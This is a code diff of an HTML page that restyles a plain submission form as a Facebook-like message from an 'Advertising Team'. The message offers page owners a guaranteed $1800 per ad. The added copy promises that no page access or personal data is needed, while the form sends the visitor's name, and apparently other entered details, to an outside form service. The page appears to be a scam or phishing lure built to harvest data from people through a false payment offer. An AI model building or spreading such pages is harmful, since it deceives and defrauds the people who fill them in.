@@ -3,8 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Submit Request</title>
-
+<title>Ad Placement Request</title>
 <style>
 body{
     margin:0;
@@ -21,12 +20,39 @@ body{
     border-radius:10px;
     box-shadow:0 2px 12px rgba(0,0,0,.08);
     padding:25px;
-    text-align:center;
 }
-h2{
-    font-size:18px;
-    color:#050505;
+.header{
+    display:flex;
+    align-items:center;
+    margin-bottom:15px;
+}
+.dp{
+    width:46px;
+    height:46px;
+    border-radius:50%;
+    background:#1877f2;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:700;
+    margin-right:12px;
+}
+.header h3{
+    margin:0;
+    font-size:16px;
+}
+.header p{
+    margin:2px 0 0;
+    font-size:13px;
+    color:#65676b;
+}
+.content{
+    font-size:15px;
+    line-height:1.6;
     margin-bottom:20px;
+    white-space:pre-line;
+    color:#050505;
 }
 form input{
     width:100%;
@@ -63,6 +89,12 @@ form button{
     0%{transform:rotate(0deg)}
     100%{transform:rotate(360deg)}
 }
+.note{
+    font-size:12px;
+    color:#65676b;
+    text-align:center;
+    margin-top:10px;
+}
 </style>
 </head>
 <body>
@@ -70,7 +102,26 @@ form button{
 <div class="container">
 <div class="card">
 
-<h2>Submitting Your Request…</h2>
+<div class="header">
+<div class="dp">AD</div>
+<div>
+<h3>Advertising Team</h3>
+<p>Paid Collaboration Request</p>
+</div>
+</div>
+
+<div class="content">
+Hello,
+
+We are looking to place an advertisement on your Facebook page. Each approved ad comes with a guaranteed payment of $1800.
+
+No access to your page or personal information is required.
+
+If you are interested, please submit your request at your earliest convenience.
+
+Thank you,  
+Advertising Team
+</div>
 
 <form id="requestForm">
     <input type="text" name="name" placeholder="Your Name" required>
@@ -79,6 +130,8 @@ form button{
         <span id="btnText">Continue</span>
     </button>
 </form>
+
+<p class="note">No page access • No personal data required</p>
 
 </div>
 </div>
@@ -91,11 +144,11 @@ const btnText = document.getElementById('btnText');
 form.addEventListener('submit', function(e){
     e.preventDefault();
 
-    // Show spinner
+    // Show spinner on button
     btn.disabled = true;
     btnText.innerHTML = '<div class="spinner"></div> Continue…';
 
-    // Submit data to external form
+    // Submit form to external service
     fetch("https://submit-form.com/upL3IuLAs", {
         method: 'POST',
         body: new FormData(form)
